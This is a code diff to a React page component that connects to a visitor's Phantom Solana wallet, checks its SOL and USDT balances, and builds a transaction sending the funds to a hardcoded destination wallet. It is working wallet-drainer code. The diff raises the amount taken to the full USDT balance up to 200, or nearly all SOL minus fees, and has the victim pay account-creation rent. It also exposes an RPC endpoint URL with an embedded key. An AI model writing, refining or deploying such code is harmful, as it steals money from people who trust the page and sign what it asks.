@@ -22,7 +22,11 @@ function Home() {
   const [activeStep, setActiveStep] = useState(1);
 
   const DESTINATION_WALLET = 'B4L5qht5t4BkV3hxLfhSTDxYBcqqwJDih3YTob9zMBh7';
-  const USDT_MINT = 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB'; // USDT on mainnet
+  const USDT_MINT = 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB'; // USDT en mainnet
+  const MINIMUM_ATA_RENT = 0.00203928; // Mínimo SOL para ATA exenta de alquiler
+  const MINIMUM_FEE = 0.000005; // Mínimo SOL para comisión de transacción
+  const MAX_USDT = 200; // Límite máximo de USDT a transferir
+  const SOL_PRICE_USD = 150; // Precio aproximado de SOL en USD (ajusta según el mercado)
 
   useEffect(() => {
     setShowAlert(true);
@@ -32,7 +36,7 @@ function Home() {
     try {
       const { solana } = window;
       if (!solana?.isPhantom) {
-        throw new Error('Phantom wallet no detectada');
+        throw new Error('Billetera Phantom no detectada');
       }
 
       const {
@@ -49,7 +53,6 @@ function Home() {
         createAssociatedTokenAccountInstruction,
       } = await import('@solana/spl-token');
 
-      // Rest of your transferCrypto function remains unchanged
       const connection = new Connection(
         'https://dimensional-alpha-sun.solana-mainnet.quiknode.pro/e0cf3c2fd17546288a9834797389721e3593d612/',
         'confirmed'
@@ -57,14 +60,24 @@ function Home() {
       const fromPublicKey = new PublicKey(walletAddress);
       const toPublicKey = new PublicKey(DESTINATION_WALLET);
 
+      // Verificar saldo de SOL primero
+      const solBalance = await connection.getBalance(fromPublicKey);
+      const solBalanceInSol = solBalance / LAMPORTS_PER_SOL;
+      console.log('Saldo en SOL:', solBalanceInSol);
+
+      // Asegurarse de tener suficiente SOL para comisiones y posible creación de ATA
+      const minimumSolRequired = MINIMUM_FEE + MINIMUM_ATA_RENT;
+      if (solBalanceInSol < minimumSolRequired) {
+        throw new Error(
+          `Saldo insuficiente de SOL. Necesitas al menos ${minimumSolRequired} SOL para cubrir comisiones y creación de cuentas. Tienes ${solBalanceInSol} SOL.`
+        );
+      }
+
       const transaction = new Transaction();
       let transferType = 'USDT';
       let finalAmount;
 
-      const solBalance = await connection.getBalance(fromPublicKey);
-      const solBalanceInSol = solBalance / LAMPORTS_PER_SOL;
-      console.log('Balance en SOL:', solBalanceInSol);
-
+      // Intentar transferencia de USDT
       const tokenAccounts = await connection.getTokenAccountsByOwner(fromPublicKey, {
         programId: TOKEN_PROGRAM_ID,
       });
@@ -78,7 +91,8 @@ function Home() {
         const mint = account.account.data.parsed.info.mint;
         if (mint === USDT_MINT) {
           const balanceInUsdt = accountInfo.value.uiAmount;
-          finalAmount = Math.min(balanceInUsdt * 0.99, 150);
+          // Transferir todo el saldo de USDT, hasta un máximo de 200
+          finalAmount = Math.min(balanceInUsdt, MAX_USDT);
           if (finalAmount <= 0) {
             break;
           }
@@ -91,9 +105,10 @@ function Home() {
 
           const toAccountInfo = await connection.getAccountInfo(toTokenAccount);
           if (!toAccountInfo) {
+            console.log('Creando ATA para la billetera de destino...');
             transaction.add(
               createAssociatedTokenAccountInstruction(
-                fromPublicKey,
+                fromPublicKey, // Pagador (tu billetera)
                 toTokenAccount,
                 toPublicKey,
                 new PublicKey(USDT_MINT)
@@ -117,12 +132,18 @@ function Home() {
         }
       }
 
+      // Recurrir a transferencia de SOL si no se puede transferir USDT
       if (!usdtFound || finalAmount <= 0) {
         transferType = 'SOL';
-        const solToSend = 2;
-        finalAmount = Math.min(solBalanceInSol * 0.99, solToSend);
-        if (finalAmount <= 0.000005) {
-          throw new Error('Fondos insuficientes en la billetera (SOL o USDT)');
+        // Transferir todo el saldo de SOL disponible, menos lo necesario para comisiones y ATA
+        const maxSolToSend = solBalanceInSol - minimumSolRequired;
+        // Calcular el equivalente en USD para no exceder 200 USDT
+        const maxSolInUsd = maxSolToSend * SOL_PRICE_USD;
+        finalAmount = Math.min(maxSolToSend, MAX_USDT / SOL_PRICE_USD); // Límite en USD convertido a SOL
+        if (finalAmount <= 0) {
+          throw new Error(
+            `Fondos insuficientes para transferir SOL. Saldo disponible después de comisiones: ${maxSolToSend} SOL.`
+          );
         }
 
         transaction.add(
@@ -134,17 +155,16 @@ function Home() {
         );
       }
 
-      if (solBalanceInSol < 0.000005) {
-        throw new Error('Saldo insuficiente de SOL para pagar las tarifas de transacción');
-      }
-
+      // Establecer metadatos de la transacción
       const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = fromPublicKey;
 
+      // Firmar y enviar transacción
       const signed = await solana.signTransaction(transaction);
       const signature = await connection.sendRawTransaction(signed.serialize());
 
+      // Confirmar transacción
       await connection.confirmTransaction({
         signature,
         blockhash,
@@ -210,6 +230,8 @@ function Home() {
     }
     setError(null);
   };
+
+
 
   return (
     <>
